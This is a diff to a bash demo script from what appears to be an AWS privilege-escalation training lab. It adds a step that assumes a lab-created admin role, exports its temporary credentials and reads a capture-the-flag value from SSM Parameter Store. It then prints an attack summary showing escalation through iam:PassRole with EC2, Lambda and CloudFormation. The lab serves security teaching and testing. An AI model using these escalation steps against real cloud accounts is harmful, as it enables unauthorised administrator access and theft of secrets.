@@ -418,9 +418,57 @@ else
     echo -e "${RED}✗ CloudFormation admin role assumption failed${NC}"
 fi
 
+# [EXPLOIT] Step 9: Capture the CTF flag using admin credentials
+# Assume the Lambda-created admin role (most reliably synchronous of the three paths)
+# and use those admin credentials to read the scenario flag from SSM Parameter Store.
 echo ""
-echo -e "${GREEN}=== Demo Complete ===${NC}"
-echo "This demonstrates multiple privilege escalation paths using EC2, Lambda, and CloudFormation."
+echo -e "${YELLOW}Step 9: Capturing CTF flag from SSM Parameter Store${NC}"
+use_starting_creds
+LAMBDA_ADMIN_ROLE_ARN_FOR_FLAG="arn:aws:iam::${ACCOUNT_ID}:role/privesc-demo-lambda-admin-role"
+ADMIN_CREDS_FOR_FLAG=$(aws sts assume-role \
+    --role-arn "$LAMBDA_ADMIN_ROLE_ARN_FOR_FLAG" \
+    --role-session-name "flag-capture" 2>/dev/null)
+if [ -n "$ADMIN_CREDS_FOR_FLAG" ]; then
+    export AWS_ACCESS_KEY_ID=$(echo "$ADMIN_CREDS_FOR_FLAG" | jq -r '.Credentials.AccessKeyId')
+    export AWS_SECRET_ACCESS_KEY=$(echo "$ADMIN_CREDS_FOR_FLAG" | jq -r '.Credentials.SecretAccessKey')
+    export AWS_SESSION_TOKEN=$(echo "$ADMIN_CREDS_FOR_FLAG" | jq -r '.Credentials.SessionToken')
+fi
+FLAG_PARAM_NAME="/pathfinding-labs/flags/multiple-paths-combined-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
+# Clean up temp files
+rm -f /tmp/ec2-userdata.sh /tmp/lambda_function.py /tmp/lambda-response.json /tmp/cf-template.yaml
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
+echo -e "\n${GREEN}========================================${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "\n${YELLOW}Attack Summary:${NC}"
+echo "1. Started as: $STARTING_USER_NAME (limited permissions)"
+echo "2. Assumed role: pl-prod-role-with-multiple-privesc-paths"
+echo "3. Launched EC2 instance with admin role (pl-prod-ec2-admin-role) via PassRole + ec2:RunInstances"
+echo "4. Created Lambda function with admin role (pl-prod-lambda-admin-role) via PassRole + lambda:CreateFunction"
+echo "5. Deployed CloudFormation stack with admin role (pl-prod-cloudformation-admin-role) via PassRole + cloudformation:CreateStack"
+echo "6. Each compute payload created a new admin IAM role trusting the starting user"
+echo "7. Achieved: Administrator Access"
+echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
+
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo -e "  $STARTING_USER_NAME"
+echo -e "  → (sts:AssumeRole) → pl-prod-role-with-multiple-privesc-paths"
+echo -e "  → (iam:PassRole + ec2:RunInstances / lambda:CreateFunction / cloudformation:CreateStack)"
+echo -e "  → New Admin Role (created by compute payload)"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
@@ -434,15 +482,9 @@ echo -e "${YELLOW}To clean up the changes made by this demo, run:${NC}"
 echo "./cleanup_attack.sh or use the plabs TUI/CLI"
 
 # Standardized test results output
-echo "TEST_RESULT:prod_role_with_multiple_privesc_paths:SUCCESS"
-echo "TEST_DETAILS:prod_role_with_multiple_privesc_paths:Successfully demonstrated EC2, Lambda, and CloudFormation privilege escalation paths"
-echo "TEST_METRICS:prod_role_with_multiple_privesc_paths:paths_tested=3,admin_roles_created=3,verification_passed=true"
-
-# Clean up temp files
-rm -f /tmp/ec2-userdata.sh /tmp/lambda_function.py /tmp/lambda-response.json /tmp/cf-template.yaml
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+echo "TEST_RESULT:multiple_paths_combined:SUCCESS"
+echo "TEST_DETAILS:multiple_paths_combined:Successfully demonstrated EC2, Lambda, and CloudFormation privilege escalation paths and captured CTF flag"
+echo "TEST_METRICS:multiple_paths_combined:paths_tested=3,admin_roles_created=3,flag_captured=true"
 
 # Mark demo as active for plabs tracking
 touch "$(dirname "$0")/.demo_active"
